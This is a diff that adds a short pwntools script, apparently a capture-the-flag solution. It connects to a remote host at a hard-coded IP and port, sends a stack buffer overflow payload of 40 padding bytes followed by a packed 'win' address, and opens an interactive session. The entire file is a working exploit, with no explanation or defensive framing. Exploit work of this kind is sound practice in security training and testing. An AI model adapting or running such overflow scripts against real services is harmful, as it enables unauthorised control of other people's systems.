@@ -1,0 +1,11 @@
+from pwn import *
+
+p = remote('211.229.250.118', 30119)
+
+p.recvuntil('> ')
+
+win = 0x74
+payload = b'a' * 40 + p64(win)
+
+p.sendline(payload)
+p.interactive()
